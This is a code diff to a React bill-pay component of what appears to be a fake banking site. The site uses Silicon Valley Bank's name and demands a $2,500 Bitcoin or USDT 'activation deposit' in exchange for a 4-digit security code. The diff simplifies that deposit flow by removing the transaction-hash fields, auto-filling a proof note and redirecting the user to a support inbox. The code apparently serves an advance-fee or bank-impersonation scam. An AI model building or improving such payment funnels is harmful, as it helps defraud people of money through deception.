@@ -24,9 +24,10 @@ import {
 interface BillPayPanelProps {
   user: User;
   onRefreshUser: () => void;
+  onNavigateTab?: (tab: string) => void;
 }
 
-export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser }) => {
+export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser, onNavigateTab }) => {
   const [bills, setBills] = useState<BillPayment[]>([]);
   const [loading, setLoading] = useState(true);
 
@@ -45,9 +46,6 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
   const [showCryptoModal, setShowCryptoModal] = useState(false);
   const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
   const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
-  const [txHash, setTxHash] = useState('');
-  const [proofNote, setProofNote] = useState('');
-  const [proofImage, setProofImage] = useState<string | null>(null);
   const [submittingDeposit, setSubmittingDeposit] = useState(false);
   const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
   const [copiedAddress, setCopiedAddress] = useState(false);
@@ -160,13 +158,18 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
       setSubmittingDeposit(true);
       await api.submitCryptoActivationDeposit({
         cryptoMethod,
-        txHash: txHash.trim(),
-        proofNote: proofNote.trim()
+        txHash: '',
+        proofNote: '$2,500 Payment Proof Verification Request'
       });
-      setDepositSuccessMsg(`$2,500 ${cryptoMethod} Deposit submitted successfully! Silicon Valley Bank will review your transaction and issue your 4-Digit Security Code.`);
-      setTxHash('');
-      setProofNote('');
+      setDepositSuccessMsg(`$2,500 ${cryptoMethod} Deposit proof submitted successfully! Directing to Support Inbox...`);
       onRefreshUser();
+      setTimeout(() => {
+        setShowCryptoModal(false);
+        setDepositSuccessMsg(null);
+        if (onNavigateTab) {
+          onNavigateTab('support');
+        }
+      }, 800);
     } catch (err: any) {
       alert(err.message || 'Failed to submit deposit proof');
     } finally {
@@ -519,37 +522,12 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                   </div>
                 </div>
 
-                {/* TxHash Input */}
-                <div>
-                  <label className="block text-slate-300 font-semibold mb-1">Transaction Hash / Blockchain TxID (Required)</label>
-                  <input
-                    type="text"
-                    required
-                    value={txHash}
-                    onChange={e => setTxHash(e.target.value)}
-                    placeholder="Paste blockchain transaction hash or reference ID"
-                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono focus:border-cyan-500 focus:outline-none"
-                  />
-                </div>
-
-                {/* Note */}
-                <div>
-                  <label className="block text-slate-300 font-semibold mb-1">Payment Proof Note / Sender Wallet (Optional)</label>
-                  <input
-                    type="text"
-                    value={proofNote}
-                    onChange={e => setProofNote(e.target.value)}
-                    placeholder="e.g. Sent from Exodus wallet / Coinbase"
-                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-cyan-500 focus:outline-none"
-                  />
-                </div>
-
                 <button
                   type="submit"
                   disabled={submittingDeposit}
-                  className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-600 text-slate-950 font-extrabold text-xs rounded-xl shadow-lg shadow-emerald-500/20 disabled:opacity-50"
+                  className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2 cursor-pointer"
                 >
-                  {submittingDeposit ? 'Submitting Verification...' : 'Submit Deposit Verification Proof'}
+                  {submittingDeposit ? 'Submitting Verification...' : 'Submit $2,500 Payment Proof for Verification'}
                 </button>
               </form>
             )}
